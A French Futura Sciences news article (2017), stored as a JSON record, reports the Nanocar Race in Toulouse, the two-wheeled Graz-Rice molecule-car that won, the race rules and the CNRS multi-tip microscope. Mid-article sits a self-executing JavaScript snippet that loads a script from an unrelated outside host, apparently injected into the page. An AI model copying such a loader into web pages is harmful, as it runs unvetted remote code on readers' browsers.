{"title": "Nanocar Race : et le vainqueur de la course est...", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-05-10", "content": "Le vainqueur de la Nanocar Race est... une nanovoiture a deux roues. La course s'est deroulee a Toulouse, les 28 et 29 avril 2017. Le vehicule mis au point par une equipe de l'universite de Graz (Autriche) et de l'universite Rice (Etats-Unis) a franchi la ligne d'arrivee apres une heure et trente minutes de course. Alors que la  duree  maximale de la Nanocar Race avait ete fixee a 36 heures, il n'aura donc pas fallu plus d'une heure et trente minutes a la premiere des  voitures  moleculaires en competition, celle presentee par une equipe de l'universite de Graz (Autriche) et de l' universite Rice  (Etats-Unis), pour franchir la ligne d'arrivee. Et ce, avec pas moins de 5 heures d'avance sur son second, concue par l'universite de Bale (Suisse). Rappelons que la  Nanocar Race  est une course comme il n'y en a pas deux. D'abord parce qu'elle se court sur une distance de 100  nanometres , soit environ un millieme du diametre d'un  cheveu humain . Ensuite, parce que, de fait, elle met en competition des voitures de tailles moleculaires. Le tout sur une piste faite d' or  scrutee par un microscope a effet tunnel multipointes. La voiture-molecule concue par une equipe de l'universite de Graz (Autriche) et de l'universite Rice (Etats-Unis) a couru a une vitesse moyenne de 95 nm.h -1 . Des pointes de vitesse ont pu etre enregistrees a quelque 300 nm.h -1 . (c)  Rice University                               Une molecule-voiture ultra rapide Multipointes, certes, mais ne permettant tout de meme pas d'opposer plus de quatre vehicules. C'est pourquoi la voiture-molecule de l'equipe Graz-Rice a ete autorisee a concourir sur sa propre piste, en  argent , avec un handicap de 50  nanometres  supplementaires a parcourir. C'est aussi pourquoi le vehicule aligne par l'equipe de l'universite de Bale et qui a concouru sur la piste initialement prevue a ete declare premier ex aequo.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ce qui n'enleve rien a la performance de l'equipe Graz-Rice. Le resultat d'une experience de pres de 20 ans, de roues - deux seulement pour minimiser les frottements et le poids - en adamantane et du plus puissant des dipoles concus par les deux universites. Le reste demeure toujours marque du sceau du  secret , mais devrait etre devoile dans les prochaines semaines. Pour en savoir plus Les molecules-voitures sont pretes pour la course ! Article du CNRS publie le 16/03/2017 Les 28 et 29 avril prochains se deroulera a Toulouse la premiere course internationale de << nanocars >>. Durant les 36 heures de cette competition, les molecules-voitures devront parcourir une piste en atomes d'or de 100 nanometres de long. Au-dela de la competition, ce defi scientifique et technologique organise par le CNRS entend faire progresser la recherche dans l'utilisation des molecules-machines, capables de rendre de nombreux services. Plus qu'une competition, la  Nanocar Race  est une experience scientifique internationale, menee en temps reel, pour tester les performances de molecules-machines et des instruments scientifiques capables de les controler. Les annees futures verront certainement nombre de ces machineries moleculaires, activees une par une ou de maniere synchronisee, s'approcher de notre quotidien : construction  atome  par atome de circuits electroniques, deconstruction atome par atome des  dechets industriels  et captation d' energie ... Cette competition est ainsi une occasion unique pour les chercheurs de mettre en oeuvre des techniques de pointe pour observer plusieurs de ces  nanomachines  en meme temps et pour les manoeuvrer de maniere independante. L'experience a commence en 2013, lors d'un travail de synthese sur les recherches concernant les  nanomachines  pour une revue scientifique : l'idee d'une course  automobile  germe alors dans l'esprit de Christian Joachim, directeur de recherche CNRS (aujourd'hui directeur de la course) et de Gwenael Rapenne, professeur de  chimie  a l'universite Toulouse III - Paul Sabatier. Trois ans plus tard, les  nanocars  sont operationnelles et pretes a s'affronter sur la surface d'or du circuit. Qu'est-ce que la  Nanocar Race  ? Presentation de la competition qui se deroulera les 28 et 29 avril prochains. Vous pourrez vivre l'evenement en direct sur NanoCar-Race.cnrs.fr et sa chaine YouTube. (c) CNRS Comment faire courir des molecules-voitures ? Du choix de la piste, qui doit supporter tous les modeles de molecules-voitures, a l'adaptation du  microscope a effet tunnel , les difficultes n'ont pas manque pour organiser cette course unique au monde. De leur cote, les equipes ont du reussir de multiples innovations -- depot et visualisation des  molecules  sous le microscope -- et remplir de nombreux criteres -- structure et mode de propulsion de la molecule. Ainsi, des neuf equipes qui ont postule jusqu'a fin mai 2016, six ont ete selectionnees et quatre seulement s'aligneront sur la ligne de depart du microscope a quatre pointes, le 28 avril 2017 a Toulouse, pour 36 heures de course. Toutes les defis auxquels repondront les chercheurs durant cette course seront autant de nouveaux pas vers des domaines inedits de la chimie et de la  physique . Chaque equipe repartira ainsi avec de nouvelles competences, de nouvelles donnees et de nouveaux savoir-faire. On peut ains esperer developper, par exemple, la chimie en surface (qui permet des syntheses chimiques directement sur une surface propre) ou une nouvelle science des surfaces, dites membranaire, qui pourrait permettre de deposer une molecule-machine sur une cellule ou de controler le  mouvement  d'une seule molecule dans un  liquide . Autour du microscope du Cemes (CNRS), quatre personnes peuvent travailler sur une meme surface. Ce dessin est extrait de la  B.D. de Jean-Yves Duhoo  presentant la  NanoCar Race . (c) CNRS, Jean-Yves Duhoo                               La Nanocar Race ouvre sur une << atome-technologie >> Le microscope du Centre d'elaboration de materiaux et d'etudes structurales (Cemes) du CNRS est le seul au monde a permettre a quatre experimentateurs distincts de travailler sur une meme surface. Le developpement de tels microscopes multipointe permettra de synchroniser un grand nombre de molecules-machines afin d'en demultiplier la puissance, pour le stockage ou la captation d'energie a partir d'une surface metallique chaude par exemple. Il s'agit ici des premiers pas d'une veritable << atome-technologie >>. Une conference de presse sera organisee a Paris, au siege du CNRS, le 4 avril prochain. Si vous souhaitez assister a la course a Toulouse, le 28 et le 29 avril, vous pourrez rencontrer les equipes et decouvrir la salle de controle d'ou les pilotes manoeuvreront les nanocars. Cependant, la salle blanche, ou se situe le microscope a quatre pointes du Cemes, sera inaccessible afin de ne pas perturber l'epreuve. La course sera retransmise en direct sur la chaine YouTube  Nanocar Race . Le saviez-vous ? Les regles de la Nanocar Race : Le parcours : 20 nm + 1 virage a 45deg+ 30 nm + 1 virage a 45deg+ 20 nm, soit environ 100 nm 36 heures de course au maximum Autorisation de changer sa nanocar en cas d'accident Interdiction de pousser sa nanocar Un secteur de la surface d'or par equipe 6 h maximum pour nettoyer sa piste avant le depart Pas de changement de pointe pendant 36 h La premiere course internationale de molecules-voitures se prepare Article du CNRS publie le 26/11/2015 La premiere course internationale de molecules-voitures se prepare a Toulouse, ce 27 novembre : cinq equipes presenteront leur prototype de vehicule. Ces engins de quelques nanometres de longueur et propulses grace a un  courant electrique  s'affronteront en octobre 2016 avant de participer a la premiere  NanoCar Race . Positionnees sur la ligne de depart, face a un circuit construit atome par atome sur une surface d' or , les << nanocars >>, qui ne font que quelques nanometres de longueur, seront pretes a demarrer, activees par de breves impulsions electriques. Comme lors d'une course de Formule 1, chaque equipe devra parcourir le plus vite possible le circuit, depuis les deux atomes representant le depart jusqu'aux deux atomes d'arrivee. Cette course microscopique a ete imaginee par Christian Joachim, directeur de recherche CNRS, et Gwenael Rapenne, professeur a l'universite Toulouse III - Paul Sabatier, au CEMES (Centre d'elaboration de materiaux et d'etudes structurales) du CNRS pour tester en conditions reelles les nanovoitures elaborees en laboratoire depuis une dizaine d'annees a travers le monde. C'est a Toulouse que ces engins de course seront presentes, lors de l'evenement  Futurapolis , le 27 novembre 2015. Les participants auront jusqu'en octobre 2016 pour synthetiser et tester leur molecule-voiture avant de participer a la premiere  NanoCar Race . La course ne sera pas visible a l' oeil  nu. Un ensemble de microscopes a  effet tunnel  unique au monde, situe a Toulouse, permettra de suivre la course : la pointe de chaque microscope balayera la surface d'une portion de piste pour la cartographier en temps reel et donner a une nanocar l'energie necessaire pour avancer. Le microscope toulousain est le seul au monde a posseder quatre pointes et donc le seul a pouvoir faire concourir quatre equipes en meme temps (si plus de quatre candidats se presentent a cette course, il sera effectue des courses eliminatoires). Chaque equipe aura a sa disposition des ecrans de controle permettant de guider sa voiture et dont les images seront retransmises en direct sur grand ecran a Toulouse et sur le site  Internet  de l'evenement en 2016. Signe de maturite de << l'atome-technologie >> Plus qu'une simple course de voitures, la  NanoCar Race  est un veritable exploit scientifique pour l'avancee des recherches dans des domaines aussi varies que les nanosciences, les  nanotechnologies , l'instrumentation, la chimie de synthese ou la science des surfaces. Elle permettra de montrer le degre de controle des molecules-machines atteint aujourd'hui en laboratoire et la maturation actuelle de << l'atome-technologie >>. Cette technique devrait permettre dans le futur la construction des premiers circuits electroniques atome par atome, minimisant a l'extreme l'utilisation des  matieres  premieres, ce qui ouvre des espoirs en matiere de  developpement durable . Retrouvez tous les concurrents le 27 novembre de 11 h a 12 h 30 a l'auditorium du Museum de Toulouse : Le  NanoMobile club  du CNRS et de l'universite Toulouse III - Paul Sabatier (France) pilote par Gwenael Rapenne. La  Nano-car Team  des universites Rice (Texas, Etats-Unis) et de Graz (Autriche) pilotee en 2016 par James Tour (Rice) et Leonhard Grill (Graz) representes a Toulouse par Grant Simpson et Knud Seufert (Graz). La  Nano-windmill Company  de l'universite technique de Dresde (Allemagne) pilotee par Francesca Moresco. La  Ohio Bobcat Nano-wagon Team  de l'universite de l'Ohio (Etats-Unis) pilotee par Saw Wai Hla et Eric Masson. La  Nano-Vehicle MANA-NIMS Team  de l'Institut Mana-Nims de Tsukuba (Japon) pilotee par Waka Nakanishi et representee a Toulouse par Kosuke Minami. Et avec la participation de Markus Maier, directeur technique de Scienta Omicron, entreprise qui a construit la machine du CEMES-CNRS a Toulouse ou se jouera cette course. Retrouvez les regles du premier Grand prix de la course internationale de Molecule-Voiture sur le site Internet du  CEMES-CNRS . Interview 1/5 : les technologies investissent l'echelle nanometrique                       Les nanotechnologies recoivent chaque annee d'enormes budgets d'investissement en recherche et developpement. C'est donc un secteur en forte croissance. Dominique Vinck, sociologue des sciences et de l'innovation, nous parle de la revolution nanotechnologique.                                       ", "theme": "sciences"}